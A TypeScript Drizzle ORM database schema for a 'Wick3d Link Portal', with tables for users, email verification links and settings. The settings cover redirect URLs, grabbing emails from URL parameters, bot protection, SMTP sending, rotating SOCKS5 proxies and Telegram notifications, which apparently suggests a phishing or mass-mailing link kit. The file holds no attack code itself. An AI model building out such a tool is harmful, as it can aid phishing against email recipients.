import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export const verificationLinks = pgTable("verification_links", {
  id: serial("id").primaryKey(),
  email: text("email").notNull(),
  code: text("code").notNull().unique(),
  status: text("status").notNull().default("pending"),
  createdAt: timestamp("created_at").notNull().defaultNow(),
  expiresAt: timestamp("expires_at").notNull(),
  verifiedAt: timestamp("verified_at"),
});

export const insertVerificationLinkSchema = createInsertSchema(verificationLinks).pick({
  email: true,
  code: true,
  expiresAt: true,
});

export const settings = pgTable("settings", {
  id: serial("id").primaryKey(),
  redirectUrl: text("redirect_url").notNull().default(""),
  showLoadingSpinner: boolean("show_loading_spinner").notNull().default(true),
  loadingDuration: integer("loading_duration").notNull().default(3),
  successMessage: text("success_message").notNull().default("Thank you for verifying your email address!"),
  useEmailAutograb: boolean("use_email_autograb").notNull().default(false),
  emailAutograbParam: text("email_autograb_param").notNull().default("email"),
  enableBotProtection: boolean("enable_bot_protection").notNull().default(true),
  customThankYouPage: text("custom_thank_you_page").notNull().default(""),
  useCustomThankYouPage: boolean("use_custom_thank_you_page").notNull().default(false),
  securityLevel: integer("security_level").notNull().default(1),
  useWildcards: boolean("use_wildcards").notNull().default(false),
  encryptionSalt: text("encryption_salt").notNull().default(""),
  // Email template settings
  emailSubject: text("email_subject").notNull().default("Please verify your email address"),
  emailTemplate: text("email_template").notNull().default("Hello,\n\nPlease click the link below to verify your email address:\n\n{link}\n\nThis link will expire in 7 days.\n\nThank you,\nWick3d Link Portal"),
  senderEmail: text("sender_email").notNull().default("no-reply@wick3d-links.com"),
  senderName: text("sender_name").notNull().default("Wick3d Link Portal"),
  smtpServer: text("smtp_server").notNull().default("localhost"),
  smtpPort: integer("smtp_port").notNull().default(25),
  smtpUser: text("smtp_user").notNull().default(""),
  smtpPassword: text("smtp_password").notNull().default(""),
  // SOCKS5 proxy settings
  useSocks5Proxy: boolean("use_socks5_proxy").notNull().default(false),
  socks5Host: text("socks5_host").notNull().default(""),
  socks5Port: integer("socks5_port").notNull().default(1080),
  socks5Username: text("socks5_username").notNull().default(""),
  socks5Password: text("socks5_password").notNull().default(""),
  socks5MaxAttempts: integer("socks5_max_attempts").notNull().default(300),
  // Saved email templates
  savedTemplates: text("saved_templates").notNull().default("[]"), // JSON array of saved templates
  // Telegram notification settings
  useTelegramNotifications: boolean("use_telegram_notifications").notNull().default(false),
  telegramBotToken: text("telegram_bot_token").notNull().default(""),
  telegramChatId: text("telegram_chat_id").notNull().default(""),
});

export const insertSettingsSchema = createInsertSchema(settings).pick({
  redirectUrl: true,
  showLoadingSpinner: true,
  loadingDuration: true,
  successMessage: true,
  useEmailAutograb: true,
  emailAutograbParam: true,
  enableBotProtection: true,
  customThankYouPage: true,
  useCustomThankYouPage: true,
  securityLevel: true,
  useWildcards: true,
  encryptionSalt: true,
  // Email template settings
  emailSubject: true,
  emailTemplate: true,
  senderEmail: true,
  senderName: true,
  smtpServer: true,
  smtpPort: true,
  smtpUser: true,
  smtpPassword: true,
  // SOCKS5 proxy settings
  useSocks5Proxy: true,
  socks5Host: true,
  socks5Port: true,
  socks5Username: true,
  socks5Password: true,
  socks5MaxAttempts: true,
  // Saved email templates
  savedTemplates: true,
  // Telegram notification settings
  useTelegramNotifications: true,
  telegramBotToken: true,
  telegramChatId: true,
});

export type User = typeof users.$inferSelect;
export type InsertUser = z.infer<typeof insertUserSchema>;

export type VerificationLink = typeof verificationLinks.$inferSelect;
export type InsertVerificationLink = z.infer<typeof insertVerificationLinkSchema>;

export type Setting = typeof settings.$inferSelect;
export type InsertSetting = z.infer<typeof insertSettingsSchema>;
